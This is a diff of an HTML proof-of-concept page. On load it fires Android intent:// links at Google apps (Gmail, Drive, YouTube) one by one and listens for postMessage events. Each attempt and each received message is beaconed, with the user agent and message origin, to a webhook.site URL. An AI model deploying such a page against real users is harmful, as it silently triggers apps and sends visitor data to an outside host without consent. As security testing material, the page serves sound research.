@@ -2,24 +2,26 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Google Apps Multi-Target PoC</title>
+<title>Google Apps Intent PoC</title>
 </head>
 <body>
-<h3>Testing Google Apps Intent:// & WebView</h3>
+<h3>Intent PoC Running...</h3>
 
 <script>
 const WEBHOOK = "https://webhook.site/893cc168-9c2c-409a-9c79-771f7d62bf3d";
 
-// Helper: lapor event ke server
-function report(app, action, status) {
+function report(data) {
+    const payload = encodeURIComponent(JSON.stringify({
+        time: Date.now(),
+        ua: navigator.userAgent,
+        ...data
+    }));
+
     const img = new Image();
-    img.src = WEBHOOK + "?app=" + encodeURIComponent(app) 
-                     + "&action=" + encodeURIComponent(action) 
-                     + "&status=" + encodeURIComponent(status);
-    console.log("Reported:", app, action, status);
+    img.src = WEBHOOK + "?d=" + payload;
 }
 
-// Daftar target apps & intent
+// 🎯 Target apps (Google only)
 const targets = [
     {
         app: "Gmail",
@@ -27,11 +29,7 @@ const targets = [
     },
     {
         app: "Drive",
-        intent: "intent://open?id=FILE_ID#Intent;scheme=https;package=com.google.android.apps.docs;end"
-    },
-    {
-        app: "Chrome",
-        intent: "intent://www.example.com#Intent;scheme=https;package=com.android.chrome;end"
+        intent: "intent://open?id=123#Intent;scheme=https;package=com.google.android.apps.docs;end"
     },
     {
         app: "YouTube",
@@ -39,23 +37,45 @@ const targets = [
     }
 ];
 
-// Coba trigger semua intents
-targets.forEach(target => {
-    try {
-        window.location.href = target.intent;
-        report(target.app, "intent_triggered", "attempted");
-    } catch(e) {
-        report(target.app, "intent_triggered", "error");
-    }
-});
+// 🔥 Trigger satu per satu (biar tidak ketabrak)
+function runTests(index = 0) {
+    if (index >= targets.length) return;
 
-// Optional: WebView / postMessage safe test
+    const t = targets[index];
+
+    try {
+        report({ app: t.app, event: "intent_attempt" });
+
+        // trigger intent
+        window.location.href = t.intent;
+
+        // fallback logging
+        setTimeout(() => {
+            report({ app: t.app, event: "intent_timeout" });
+            runTests(index + 1);
+        }, 3000);
+
+    } catch (e) {
+        report({ app: t.app, event: "intent_error" });
+        runTests(index + 1);
+    }
+}
+
+// 🔍 postMessage probe
 window.addEventListener("message", (evt) => {
-    report("AllApps", "postMessage_received", evt.origin);
+    report({
+        app: "GLOBAL",
+        event: "postMessage_received",
+        origin: evt.origin,
+        data: typeof evt.data
+    });
 }, false);
 
+window.onload = () => {
+    runTests();
+};
 </script>
 
-<p>Check your webhook to see which intents fired.</p>
+<p>Check webhook for logs.</p>
 </body>
 </html>
